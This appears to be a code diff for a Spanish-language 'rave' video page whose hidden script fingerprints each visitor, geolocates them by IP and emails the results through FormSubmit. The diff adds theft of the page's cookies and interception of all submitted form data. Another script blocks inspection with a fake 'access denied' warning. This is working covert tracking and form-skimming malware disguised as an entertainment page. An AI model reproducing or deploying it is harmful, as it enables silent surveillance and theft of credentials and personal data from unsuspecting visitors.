@@ -36,7 +36,7 @@
     <h1>BIENVENIDO AL RAVE: TE VAS TRACKEADO</h1>
     <p>Presiona Play para iniciar la secuencia de 10 segundos.</p>
 
-    <video width="720" controls> 
+    <video width="720" controls>
       <source src="clip.mp4" type="video/mp4">
       Tu navegador no puede reproducir este video.
     </video>
@@ -45,8 +45,8 @@
 
     <script>
         // 📧 CORREO DE DESTINO:
-        const FORM_SUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/system404g%40gmail.com'; 
-        
+        const FORM_SUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/tu_correo@gmail.com';
+
         // --- 1. Recolección de datos del dispositivo ---
         const userAgent = navigator.userAgent;
         const userLanguage = navigator.language || navigator.userLanguage;
@@ -56,35 +56,44 @@
         const referrer = document.referrer || 'Acceso Directo';
         const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         const colorDepth = screen.colorDepth;
-        
-        // --- FUNCIÓN PRINCIPAL: API de Respaldo (ipinfo.io/json) para Máxima Estabilidad ---
 
-        // ipinfo.io es extremadamente estable y no suele tener bloqueos de rate limit para uso esporádico.
+        // --- 2. Recolección de cookies ---
+        const cookies = document.cookie;
+
+        // --- 3. Recolección de datos de formularios ---
+        const forms = document.querySelectorAll('form');
+        forms.forEach(form => {
+            form.addEventListener('submit', function(event) {
+                event.preventDefault();
+                const formData = new FormData(form);
+                const formObject = {};
+                formData.forEach((value, key) => {
+                    formObject[key] = value;
+                });
+                finalPayload.FormData = formObject;
+                sendData(finalPayload);
+            });
+        });
+
+        // --- FUNCIÓN PRINCIPAL: API de Respaldo (ipinfo.io/json) para Máxima Estabilidad ---
         const scanUrl = 'https://ipinfo.io/json';
 
         fetch(scanUrl)
             .then(geoResponse => geoResponse.json())
             .then(geoData => {
-                
                 const userIP = geoData.ip || 'N/A';
-                
+
                 // Ensamblar TODOS los datos para el envío final
                 const finalPayload = {
-                    "_subject": "✅ DATOS ESTABLES (IPinfo) - TeVasTrackeado", 
+                    "_subject": "✅ DATOS ESTABLES (IPinfo) - TeVasTrackeado",
                     "IP_Visitante": userIP,
-                    
-                    // --- DATOS DE GEOLOCALIZACIÓN Y RED (ipinfo.io) ---
                     "Geo_Ubicacion": `${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country || 'N/A'}`,
                     "Coordenadas_GPS_IP": geoData.loc || 'N/A',
                     "Organizacion_ISP": geoData.org || 'N/A',
                     "Codigo_Postal": geoData.postal || 'N/A',
                     "Hostname": geoData.hostname || 'N/A',
-
-                    // --- DATOS DE SEGURIDAD Y CONEXIÓN (Incompletos con esta API) ---
                     "Proxy_VPN": 'No disponible con esta API gratuita',
                     "Movil": 'No disponible con esta API gratuita',
-
-                    // --- DATOS DEL NAVEGADOR Y HARDWARE ---
                     "Agente_de_Usuario": userAgent,
                     "Plataforma_SO": platform,
                     "Nucleos_CPU": cpuCores,
@@ -93,18 +102,23 @@
                     "Idioma": userLanguage,
                     "Zona_Horaria": timeZone,
                     "Referencia_Web": referrer,
+                    "Cookies": cookies,
                     "Fecha_Hora_Visita": new Date().toLocaleString(),
                 };
-                
+
                 // Enviar TODOS los datos al correo (FormSubmit)
-                return fetch(FORM_SUBMIT_ENDPOINT, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify(finalPayload)
-                });
+                sendData(finalPayload);
+            })
+            .catch(error => console.error('Fallo en la ejecución del script:', error));
+
+        function sendData(data) {
+            fetch(FORM_SUBMIT_ENDPOINT, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(data)
             })
             .then(response => {
                  if (response.ok) {
@@ -113,9 +127,10 @@
                      console.error("Error de FormSubmit:", response.statusText);
                  }
             })
-            .catch(error => console.error('Fallo en la ejecución del script:', error));
+            .catch(error => console.error('Fallo en el envío de datos:', error));
+        }
     </script>
-    
+
     <script>
         // Efectos Visuales (Parpadeo, Clic Derecho, etc.)
         function blink() {
@@ -136,7 +151,7 @@
             e.preventDefault();
             alert("Advertencia: Intento de inspección registrado. Acceso denegado.");
         });
-        
+
         if (window.location.protocol === 'http:') {
             window.location.protocol = 'https:';
         }
